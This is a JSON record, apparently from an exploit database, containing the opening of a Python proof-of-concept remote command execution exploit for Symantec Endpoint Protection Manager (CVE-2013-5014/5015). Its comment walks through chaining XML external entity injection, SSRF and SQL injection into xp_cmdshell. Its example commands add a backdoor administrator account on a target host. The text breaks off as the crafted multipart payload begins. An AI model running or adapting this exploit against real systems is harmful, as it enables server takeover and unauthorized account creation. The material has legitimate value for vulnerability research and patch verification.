{
    "text": "vul_name : Symantec Endpoint Protection Manager Remote Command Execution ， vul_cve : CVE-2013-5014 , CVE-2013-5015 ， vul_poc : import argparse ， \" ， Exploit Title : Symantec Endpoint Protection Manager Remote Command Execution ， Exploit Author : Chris Graham @ cgrahamseven ， CVE : CVE-2013-5014 , CVE-2013-5015 ， Date : February 22 , 2014 ， Vendor Homepage :  ， Version : 11.0 , 12.0 , 12.1 ， Tested On : Windows Server 2003 , default SEPM install using embedded database ， Details :  ， First off , this was a fantastic discovery by Stefan Viehbock. The abuse of the XE ， injection to force SEPM to exploit itself through a separate SQL injection flaw was ， particularly amusing. I suspect the majority of SEPM users will have it configured ， with the default embedded database , thereby making this a pretty reliable exploit. ， So basically what you are looking for with the XE injection is a vulnerability ， that can be triggered in the ConsoleServlet. When a multipart http request is sent ,  ， the servlet will use a custom MultipartParser class to handle the individual ， multipart bodies. When a body is encountered that uses a Content-Type of text/xml ,  ， the Java DocumentBuilder class is used to parse the xml. Since Symantec did not ， disallow declared DTD processing , it is vulnerable to the XE injection. This ， appears to be a blind XE , so a better use of the vulnerability is use it for SSRF. ， That leads us to the SQL injection flaw. ， Symantec has an http request handler called ConfigServerHandler that is programmatically ， restricted to only handle requests that come from localhost. I guess when they wrote this ， they just assumed that there was never going to be a way to send untrusted input to it ， since it was always going to be controlled by them. I base this guess on the fact that ， there is absolutely no attempt made to validate what input comes in to the ， updateReportingVersion function which shoves it directly into a SQL query unfiltered. In ， order to trigger the SQL injection you just need to send the SQL injection string in the ， \"Parameter\" url param with the \"action\" param set to test_av. On a default install of SEPM ,  ， it uses a SQL Anywhere embedded database. Much like MSSQL , SQL Anywhere has an xp_cmdshell ， stored procedure to run local OS commands. Using this stored procedure , you can compromise ， the server that is running SEPM. ， Example Usage :  ， python sepm_xe_exploit.py -t 192.168.1.100 -c \"net user myadmin p @ ss ! 23 /add\" ， python sepm_xe_exploit.py -t 192.168.1.100 -c \"net localgroup Administrators myadmin /add\" ， \" ， multipart_body = \\ ， \"-=_Part_156_33010715.1234\\r\\n\" + \\ ， \"Content-Type : text/xml\\r\\n\" + \\ ， \"Content-Disposition : form-data ; name=\\\"Content\\\"\\r\\n\\r\\n\" + \\ ， \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\r\\n\" + \\",
    "time": "2014.02.24"
}